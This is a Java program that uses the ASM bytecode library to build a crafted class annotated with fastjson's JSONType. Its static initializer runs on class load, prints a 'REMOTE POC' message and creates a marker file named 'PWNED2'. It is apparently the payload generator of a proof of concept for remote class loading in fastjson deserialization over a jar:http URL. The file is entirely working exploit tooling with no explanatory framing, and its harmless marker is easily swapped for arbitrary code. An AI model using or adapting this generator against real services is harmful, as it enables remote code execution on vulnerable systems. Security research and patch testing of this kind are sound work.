import org.objectweb.asm.AnnotationVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

import java.nio.file.Files;
import java.nio.file.Paths;

public class Gen {
    public static void main(String[] args) throws Exception {
        if (args.length != 2) {
            System.out.println("Usage: java Gen <internal-class-name> <output-class-file>");
            return;
        }

        String internalName = args[0];
        String outputFile = args[1];

        ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        writer.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, internalName, null, "java/lang/Object", null);

        AnnotationVisitor annotation = writer.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true);
        annotation.visitEnd();

        MethodVisitor method = writer.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        method.visitCode();
        method.visitVarInsn(Opcodes.ALOAD, 0);
        method.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        method.visitInsn(Opcodes.RETURN);
        method.visitMaxs(1, 1);
        method.visitEnd();

        method = writer.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
        method.visitCode();
        method.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");
        method.visitLdcInsn("REMOTE POC <clinit> EXECUTED (class defined from jar:http URL)");
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
        method.visitTypeInsn(Opcodes.NEW, "java/io/File");
        method.visitInsn(Opcodes.DUP);
        method.visitLdcInsn(System.getProperty("poc.pwnedFile", "PWNED2"));
        method.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/io/File", "<init>", "(Ljava/lang/String;)V", false);
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/File", "createNewFile", "()Z", false);
        method.visitInsn(Opcodes.POP);
        method.visitInsn(Opcodes.RETURN);
        method.visitMaxs(3, 0);
        method.visitEnd();

        writer.visitEnd();
        Files.write(Paths.get(outputFile), writer.toByteArray());
        System.out.println("crafted class written to " + outputFile);
    }
}
